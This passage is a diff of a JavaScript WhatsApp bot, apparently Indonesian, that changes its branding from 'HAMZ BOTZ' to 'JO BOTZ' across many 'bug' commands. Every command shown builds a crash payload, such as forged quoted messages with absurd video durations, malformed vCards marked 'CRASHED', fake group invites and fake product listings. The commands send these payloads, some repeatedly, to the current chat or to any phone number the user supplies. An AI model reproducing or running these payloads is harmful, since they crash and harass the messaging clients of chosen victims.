 "mimetype": "image/jpeg", 
-"caption": `𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕, 
+"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`, 
 "jpegThumbnail": virgam
 } 
 } 
 }
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕[CRASH]"},{quoted:foto1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:foto1})
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:foto1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:foto1})
 jancok(`Berhasil Mengirim Bug2 Di Nomer ${text}`)
 break
 case 'jobug3':
@@ -4324,7 +4324,7 @@ message: {
 }
 } 
 }
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fvoc})}
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fvoc})}
 jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
 case 'josendbug3':
@@ -4344,7 +4344,7 @@ message: {
 }
 } 
 }
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fvoc})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fvoc})
 await m.reply(`Berhasil Mengirim Bug3 Di Nomer ${text}`)
 break
 case 'jogasbug3':
@@ -4364,8 +4364,8 @@ message: {
 }
 } 
 }
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fvoc1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fvoc1})
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fvoc1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fvoc1})
 jancok(`Berhasil Mengirim Bug3 Di Nomer ${text}`)
 break
 case 'jobug4':
@@ -4383,7 +4383,7 @@ message: { "videoMessage": {
 "title":"hallo bang","h": 
 `Hmm`,'seconds': '359996400', 
 'gifPlayback': 'true', 
-'caption': `𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕`,
+'caption': `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
 'jpegThumbnail': fs.readFileSync(`./pict.jpg`),
 }
 }
@@ -4403,12 +4403,12 @@ message: { "videoMessage": {
 "title":"hallo bang","h": 
 `Hmm`,'seconds': '359996400', 
 'gifPlayback': 'true', 
-'caption': `𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕`,
+'caption': `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
 'jpegThumbnail': fs.readFileSync(`./pict.jpg`),
 }
 }
 }
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fgif})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fgif})
 await m.reply(`Berhasil Mengirim Bug4 Di Nomer ${text}`)
 break
 case 'jogasbug4':
@@ -4423,13 +4423,13 @@ message: { "videoMessage": {
 "title":"hallo bang","h": 
 `Hmm`,'seconds': '359996400', 
 'gifPlayback': 'true', 
-'caption': `𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕`,
+'caption': `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
 'jpegThumbnail': fs.readFileSync(`./pict.jpg`),
 }
 }
 }
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fgif1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fgif1})
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fgif1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fgif1})
 jancok(`Berhasil Mengirim Bug4 Di Nomer ${text}`)
 break
 case 'jobug5':
@@ -4444,12 +4444,12 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: {
 liveLocationMessage: {
-caption: `By: 𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕`,
+caption: `By: 𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
 jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
 }
 }
 }
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:floc})}
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:floc})}
 jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
 break 
 case 'josendbug5':
@@ -4461,12 +4461,12 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: {
 liveLocationMessage: {
-caption: `By: 𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕`,
+caption: `By: 𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
 jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
 }
 }
 }
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:floc})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:floc})
 await m.reply(`Berhasil Mengirim Bug5 Di Nomer ${text}`)
 break 
 case 'jogasbug5':
@@ -4478,13 +4478,13 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: {
 liveLocationMessage: {
-caption: `By: 𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕`,
+caption: `By: 𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
 jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
 }
 }
 }
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:floc1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:floc1})
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:floc1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:floc1})
 jancok(`Berhasil Mengirim Bug5 Di Nomer ${text}`)
 break 
 case 'jobug6':
@@ -4504,14 +4504,14 @@ message: {
 "productImage":{ 
 "mimetype": "image/jpeg", 
 "jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
-"title": "𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕", 
-"description": "𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕", 
+"title": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
+"description": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
 "currencyCode": "USD", 
 "priceAmount1000": "5000000000", 
-"retailerId": "𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕", 
+"retailerId": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
 "productImageCount": 1}, 
 "businessOwnerJid": `6285737134572@s.whatsapp.net`}}}	
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:ftoko})}
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:ftoko})}
 jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
 case 'josendbug6':
@@ -4528,14 +4528,14 @@ message: {
 "productImage":{ 
 "mimetype": "image/jpeg", 
 "jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
-"title": "𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕", 
-"description": "𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕", 
+"title": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
+"description": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
 "currencyCode": "USD", 
 "priceAmount1000": "5000000000", 
-"retailerId": "𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕", 
+"retailerId": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
 "productImageCount": 1}, 
 "businessOwnerJid": `6285737134572@s.whatsapp.net`}}}	
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:ftoko})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:ftoko})
 await m.reply(`Berhasil Mengirim Bug6 Di Nomer ${text}`)
 break
 case 'jogasbug6':
@@ -4552,15 +4552,15 @@ message: {
 "productImage":{ 
 "mimetype": "image/jpeg", 
 "jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
-"title": "𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕", 
-"description": "𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕", 
+"title": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
+"description": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
 "currencyCode": "USD", 
 "priceAmount1000": "5000000000", 
-"retailerId": "𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕", 
+"retailerId": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
 "productImageCount": 1}, 
 "businessOwnerJid": `6285737134572@s.whatsapp.net`}}}
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:ftoko1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:ftoko1})
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:ftoko1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:ftoko1})
 jancok(`Berhasil Mengirim Bug6 Di Nomer ${text}`)
 break
 case 'jobug7':
@@ -4581,7 +4581,7 @@ viewOnce: true
 },
 },
 };
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:foncevid})}
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:foncevid})}
 jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
 case 'josendbug7':
@@ -4599,7 +4599,7 @@ viewOnce: true
 },
 },
 };
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:foncevid})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:foncevid})
 await m.reply(`Berhasil Mengirim Bug7 Di Nomer ${text}`)
 break
 case 'jogasbug7':
@@ -4617,8 +4617,8 @@ viewOnce: true
 },
 },
 };
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:foncevid1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:foncevid1})
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:foncevid1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:foncevid1})
 jancok(`Berhasil Mengirim Bug7 Di Nomer ${text}`)
 break
 case 'jobug8':
@@ -4638,7 +4638,7 @@ viewOnce: true
 },
 },
 };
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fonceimg})}
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fonceimg})}
 jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
 case 'josendbug8':
@@ -4655,7 +4655,7 @@ viewOnce: true
 },
 },
 };
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fonceimg})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fonceimg})
 await m.reply(`Berhasil Mengirim Bug8 Di Nomer ${text}`)
 break
 case 'jogasbug8':
@@ -4672,8 +4672,8 @@ viewOnce: true
 },
 },
 };
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fonceimg1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fonceimg1})
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fonceimg1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fonceimg1})
 jancok(`Berhasil Mengirim Bug8 Di Nomer ${text}`)
 break
 case 'jobug9':
@@ -4692,9 +4692,9 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 "groupJid": "62895619083555-1616169743@g.us",
 "inviteCode": "mememteeeekkeke",
 "groupName": "P",
-"caption": `𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕`,
+"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
  'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fgc})
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fgc})
 }
 jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
@@ -4711,9 +4711,9 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 "groupJid": "62895619083555-1616169743@g.us",
 "inviteCode": "mememteeeekkeke",
 "groupName": "P",
-"caption": `𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕`,
+"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
  'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fgc})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fgc})
 await m.reply(`Berhasil Mengirim Bug9 Di Nomer ${text}`)
 break
 case 'jogasbug9':
@@ -4729,10 +4729,10 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 "groupJid": "62895619083555-1616169743@g.us",
 "inviteCode": "mememteeeekkeke",
 "groupName": "P",
-"caption": `𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕`,
+"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
  'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
- jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fgc1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fgc1})
+ jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fgc1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fgc1})
 jancok(`Berhasil Mengirim Bug9 Di Nomer ${text}`)
 break
 case 'jobug10':
@@ -4764,7 +4764,7 @@ let stic = {
 "messageTimestamp": "1614070775",
 "status": "PENDING"
  }
- jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:stic})
+ jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:stic})
  }
  jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
  break
@@ -4794,7 +4794,7 @@ let stic = {
 "messageTimestamp": "1614070775",
 "status": "PENDING"
  }
- jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:stic})
+ jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:stic})
  await m.reply(`Berhasil Mengirim Bug10 Di Nomer ${text}`)
  break
 case 'jogasbug10':
@@ -4823,8 +4823,8 @@ let stic1 = {
 "messageTimestamp": "1614070775",
 "status": "PENDING"
  }
- jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:stic1})
- jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:stic1})
+ jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:stic1})
+ jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:stic1})
  jancok(`Berhasil Mengirim Bug10 Di Nomer ${text}`)
  break
 //Bug quoted versi gua ini gua campuran sama yg virkon crash home yg udh punah itu🗿
@@ -4840,10 +4840,10 @@ fromMe: false,
 participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
 },
 message: { "contactMessage": { 
-"displayName": `𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕`,
+"displayName": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
  "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
  "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fkon})
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fkon})
 }
 jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
 break 
@@ -4856,10 +4856,10 @@ fromMe: false,
 participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
 },
 message: { "contactMessage": { 
-"displayName": `𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕`,
+"displayName": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
  "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
  "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fkon})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fkon})
 await m.reply(`Berhasil Mengirim Bug11 Di Nomer ${text}`)
 break 
 case 'jogasbug11':
@@ -4871,11 +4871,11 @@ fromMe: false,
 participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
 },
 message: { "contactMessage": { 
-"displayName": `𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕`,
+"displayName": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`,
  "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
  "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
- jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fkon1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fkon1})
+ jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fkon1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fkon1})
 jancok(`Berhasil Mengirim Bug11 Di Nomer ${text}`)
 break 
 case 'jobug12':
@@ -4894,13 +4894,13 @@ participant: `0@s.whatsapp.net`,
 "groupInviteMessage": {
 "groupJid": "6288213840883-1616169743@g.us",
 "inviteCode": `ith6ffr68`,
-"groupName": `𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]`, 
-"caption": `𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]`, 
+"groupName": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]`, 
+"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]`, 
 'jpegThumbnail': virgam
 }
 }
 }
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕[CRASH]"},{quoted:finv})
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:finv})
 }
 jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
@@ -4917,13 +4917,13 @@ participant: `0@s.whatsapp.net`,
 "groupInviteMessage": {
 "groupJid": "6288213840883-1616169743@g.us",
 "inviteCode": `ith6ffr68`,
-"groupName": `𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]`, 
-"caption": `𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]`, 
+"groupName": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]`, 
+"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]`, 
 'jpegThumbnail': virgam
 }
 }
 }
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:finv})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:finv})
 await m.reply(`Berhasil Mengirim Bug12 Di Nomer ${text}`)
 break
 case 'jogasbug12':
@@ -4939,14 +4939,14 @@ participant: `0@s.whatsapp.net`,
